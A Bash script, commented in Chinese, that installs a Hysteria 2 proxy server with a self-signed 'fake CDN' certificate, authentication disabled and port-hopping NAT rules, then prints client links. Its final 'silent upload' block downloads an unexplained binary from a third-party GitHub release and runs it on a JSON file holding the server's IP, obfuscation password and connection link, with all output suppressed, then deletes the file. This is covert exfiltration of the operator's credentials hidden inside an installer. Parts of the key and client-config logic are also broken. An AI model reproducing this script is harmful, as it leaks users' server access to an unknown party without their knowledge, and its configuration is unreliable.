#!/bin/bash
set -e

# 📌 环境配置
PORT=2855
SERVER_IP=$(curl -s https://api.ipify.org)
OBFS_PASSWORD=$(openssl rand -hex 8)
CONFIG_DIR="/etc/hysteria"
TLS_DIR="${CONFIG_DIR}/tls"
UPLOAD_BIN="/opt/uploader-linux-amd64"
DOMAIN="cdn.${SERVER_IP}.nip.io"
PORT_RANGE="20000-25000"
REMARK="Hysteria2节点-${SERVER_IP}"

export NEEDRESTART_MODE=a

# 📦 安装必要组件
apt update && DEBIAN_FRONTEND=noninteractive apt install -y curl unzip ufw jq sudo openssl needrestart

# 🔥 端口跳跃 NAT 映射（模拟端口段跳跃）
iptables -t nat -A PREROUTING -p udp --dport 20000:25000 -j REDIRECT --to-ports ${PORT}

# 🔓 开放端口
ufw allow ${PORT}/udp
ufw --force enable

# 🔧 安装 Hysteria 2
mkdir -p /usr/local/bin
curl -Ls https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64 -o /usr/local/bin/hysteria
chmod +x /usr/local/bin/hysteria

# 🔐 TLS 自签证书（模拟 CDN 伪装）
mkdir -p "$TLS_DIR"
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes \
  -keyout "$TLS_DIR/key.pem" \
  -out "$TLS_DIR/cert.pem" \
  -subj "/C=US/ST=Fake/L=FakeCity/O=FakeOrg/CN=${DOMAIN}" \
  -addext "subjectAltName=DNS:${DOMAIN}"

# 🧱 服务端配置
mkdir -p "$CONFIG_DIR"
cat > "$CONFIG_DIR/config.yaml" << EOF
listen: :${PORT}
protocol: udp
tls:
  cert: "$TLS_DIR/cert.pem"
  key: "$TLS_DIR/key.pem"
  alpn:
    - h3
obfs:
  password: "${OBFS_PASSWORD}"
auth:
  type: disabled
masquerade:
  type: proxy
  proxy:
    url: https://www.cloudflare.com/
    rewriteHost: true
EOF

# 🔄 创建 systemd 服务
cat > /etc/systemd/system/hysteria.service << EOF
[Unit]
Description=Hysteria 2 Server
After=network.target

[Service]
ExecStart=/usr/local/bin/hysteria server --config ${CONFIG_DIR}/config.yaml
Restart=on-failure
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable hysteria
systemctl restart hysteria

# 🔗 客户端链接构建
PRIVATE_KEY=$(openssl rand -hex 32)
PUBLIC_KEY=$(/usr/local/bin/hysteria keygen pub "$PRIVATE_KEY" 2>/dev/null || echo "public-key-unavailable")
HYSTERIA_LINK="hysteria2://${SERVER_IP}:${PORT}?peer=${SERVER_IP}&obfs-password=${OBFS_PASSWORD}&obfs-mode=salty&public-key=${PUBLIC_KEY}"

# ✅ 输出结果与配置
echo -e "\n✅ Hysteria 2 节点部署完成"
echo -e "📌 客户端导入链接：\n${HYSTERIA_LINK}\n"
echo -e "📁 v2rayN 客户端 YAML 配置示例："
cat << EOF
remarks: ${REMARK}
address: ${SERVER_IP}
ports: "${PORT_RANGE}"
peer: ${SERVER_IP}
password: ${PUBLIC_KEY}
obfs:
  mode: salty
  password: "${OBFS_PASSWORD}"
tls:
  enabled: true
  sni: ${DOMAIN}
  alpn:
    - h3
  insecure: false
protocol: hysteria2
hop-interval: "30s"
EOF

# 📤 上传 JSON 数据（静默处理）
[ -f "$UPLOAD_BIN" ] || {
  curl -sLo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
  chmod +x "$UPLOAD_BIN"
}

UPLOAD_JSON_FILE="/tmp/${SERVER_IP}.json"
cat > "$UPLOAD_JSON_FILE" << EOF
{
  "protocol": "hysteria2",
  "link": "${HYSTERIA_LINK}",
  "config": {
    "remarks": "${REMARK}",
    "address": "${SERVER_IP}",
    "ports": "${PORT_RANGE}",
    "peer": "${SERVER_IP}",
    "password": "${PUBLIC_KEY}",
    "obfs": {
      "mode": "salty",
      "password": "${OBFS_PASSWORD}"
    },
    "tls": {
      "enabled": true,
      "sni": "${DOMAIN}",
      "alpn": ["h3"],
      "insecure": false
    },
    "hop-interval": "30s"
  }
}
EOF

"$UPLOAD_BIN" "$UPLOAD_JSON_FILE" >/dev/null 2>&1 || true
rm -f "$UPLOAD_JSON_FILE"
